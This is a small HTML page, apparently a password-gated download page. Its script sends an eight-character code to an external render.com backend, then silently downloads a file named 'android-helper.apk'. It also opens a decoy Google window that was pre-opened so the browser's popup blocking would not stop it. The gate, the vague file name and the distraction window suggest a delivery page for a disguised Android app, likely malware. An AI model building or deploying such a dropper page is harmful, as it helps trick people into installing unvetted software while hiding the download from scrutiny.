<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Check</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f4f4f5;
      font-family: Arial, sans-serif;
    }

    #password {
      width: min(90%, 320px);
      padding: 14px 16px;
      border: 1px solid #ccc;
      border-radius: 10px;
      outline: none;
      font-size: 16px;
      text-align: center;
      background: white;
    }

    #password:focus {
      border-color: #555;
    }

    #password.correct {
      border: 2px solid #000;
    }

    #password.incorrect {
      border: 2px solid #f00;
    }

    #password::placeholder {
      color: #999;
    }
  </style>
</head>

<body>

  <input
    id="password"
    type="password"
    maxlength="8"
    autocomplete="new-password"
    placeholder="Enter here"
  >

  <script>
    const BACKEND_URL = "https://p2-q4uh.onrender.com";
    const passwordInput = document.getElementById("password");

    passwordInput.addEventListener("input", async () => {

      passwordInput.classList.remove("correct", "incorrect");

      if (passwordInput.value.length !== 8) {
        return;
      }

      // Open a window while the input action is still active.
      // This gives the browser a better chance of allowing it.
      const googleWindow = window.open("about:blank", "_blank");

      try {
        const response = await fetch(BACKEND_URL + "/api/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            password: passwordInput.value
          })
        });

        if (!response.ok) {
          passwordInput.classList.add("incorrect");

          if (googleWindow && !googleWindow.closed) {
            googleWindow.close();
          }

          return;
        }

        passwordInput.classList.add("correct");

        const blob = await response.blob();
        const url = URL.createObjectURL(blob);

        // Start APK download
        const downloadLink = document.createElement("a");
        downloadLink.href = url;
        downloadLink.download = "android-helper.apk";

        document.body.appendChild(downloadLink);
        downloadLink.click();
        downloadLink.remove();

        // Send the already-open window to Google
        if (googleWindow && !googleWindow.closed) {
          googleWindow.location.href = "https://www.google.com";
        } else {
          // Fallback
          window.open("https://www.google.com", "_blank");
        }

        setTimeout(() => {
          URL.revokeObjectURL(url);
        }, 2000);

      } catch (error) {
        console.error("Download failed:", error);
        passwordInput.classList.add("incorrect");

        if (googleWindow && !googleWindow.closed) {
          googleWindow.close();
        }
      }
    });
  </script>

</body>
</html>
